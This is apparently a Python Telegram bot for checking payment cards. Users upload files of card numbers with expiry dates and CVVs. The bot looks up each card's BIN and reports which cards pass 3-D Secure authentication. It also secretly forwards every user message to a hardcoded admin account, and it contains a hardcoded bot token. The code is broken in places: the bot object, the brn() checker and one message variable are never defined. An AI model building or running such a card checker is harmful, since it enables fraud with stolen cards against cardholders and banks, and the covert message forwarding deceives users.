import requests
import telebot
from telebot import types
import telebot,os
import time
import re
import base64
import user_agent
from getuseragent import UserAgent
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
photo_url = 'https://t.me/GF_MAA/881'
admin = 5168499996
token = "8685202751:AAH1x_gcDIkaYQrPSlr09B7DRMKbrk2yas4"
@bot.message_handler(commands=["start"])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    cmds_button = types.InlineKeyboardButton(text="𝐂𝐌𝐃𝐒", callback_data="cmds")
    keyboard.add(cmds_button)
    bot.send_photo(
        message.chat.id,
        photo=photo_url,
        caption=" Active ✅ Join <a href=\"t.me/+usmFsy9CvAdiNWQy\">Here</a> to Get Updates And Keys For The Bot. By <a href=\"t.me/M_ok_shaa\">𝙈𝙊𝙆𝙎𝙃𝘼</a> ",
        reply_markup=keyboard
    )
@bot.callback_query_handler(func=lambda call: call.data == 'cmds')
def cmds_callback(call):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        types.InlineKeyboardButton("𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url="https://t.me/+usmFsy9CvAdiNWQy"),
        types.InlineKeyboardButton("𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url="https://t.me/M_ok_shaa")
    )

    try:
        # تعديل التعليق المرفق مع الصورة بدلاً من حذف الرسالة
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=f'''<b> 

━━━━━━━━━━━━━━━━━━━━━━━━

✅ 𝟑𝐃 𝐋𝐎𝐎𝐊𝐔𝐏
<code>/vbv</code> 𝐍𝐔𝐌𝐁𝐄𝐑|𝐌𝐌|𝐘𝐘|𝐂𝐕𝐕

━━━━━━━━━━━━━━━━━━━━━━━━</b>''',
            parse_mode='HTML',
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"An error occurred: {e}")


##

#gatet
#
#
##
#





#



#




#
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	ch = 0
	otp = 0
	last = 0
	ko = (bot.reply_to(message, "𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
				                data = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
				                bank = data.get('bank', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                country_flag = data.get('country', {}).get('emoji', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                country = data.get('country', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                brand = data.get('scheme', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				                card_type = data.get('type', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				                url = data.get('bank', {}).get('url', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				except Exception:
					bank = country_flag = country = brand = card_type = url = '𝒖𝒏𝒌𝒎𝒏𝒘𝒏'
				try:
					last = str(brn(cc))
				except Exception as e:
					print(e)
				mes = types.InlineKeyboardMarkup(row_width=1)
				mero = types.InlineKeyboardButton(f"{last}", callback_data='u8')
				cm1 = types.InlineKeyboardButton(f"{cc}", callback_data='u8')
				#cm2 = types.InlineKeyboardButton(f"𝗢𝘁𝗽 ⛔ {ch}", callback_data='x')
				me = types.InlineKeyboardButton(f"𝐏𝐚𝐬𝐬𝐞𝐝 ✅ {otp}", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ {dd}", callback_data='x')
				stop = types.InlineKeyboardButton(f"𝐒𝐓𝐎𝐏 ⚠️ ", callback_data='u8')
				mes.add(mero,cm1, me,  cm3 ,stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛''', reply_markup=mes)
				
				


				msg = f'''𝐏𝐚𝐬𝐬𝐞𝐝 ✅ 
[↯] 𝗖𝗖 ⇾ {cc} 
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ 𝟯𝗗 𝗟𝗼𝗼𝗸𝗨𝗣
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → {cc[:6]} - {card_type} - {brand} 
[↯] 𝗕𝗮𝗻𝗸  → {bank} 
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} - {country_flag} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@i7cy7』'''
				#print(last)
				if "3DS Authenticate Attempt Successful ✅" in last or '3DS Authenticate Successful ✅' in last or 'authenticate_attempt_successful' in last:
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msg}</strong>",parse_mode="html",reply_markup=key)
					otp += 1
				elif 'y3DS Challenge Required ❌' in last or 'y3DS Authenticate Frictionless yFailed ❌' in last or 'y3DS Authenticate yRejected ❌' in last:
					ch += 1
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msgs}</strong>",parse_mode="html",reply_markup=key)
				else:
					dd += 1
					time.sleep(9)
	except:
		pass
print("تم تشغيل البوت")

@bot.message_handler(func=lambda message: True, content_types=[
'text','photo','video','document','audio','voice','sticker','animation'
])
def forward_to_admin(message):
    try:
        bot.forward_message(admin, message.chat.id, message.message_id)
    except:
        pass

bot.polling()
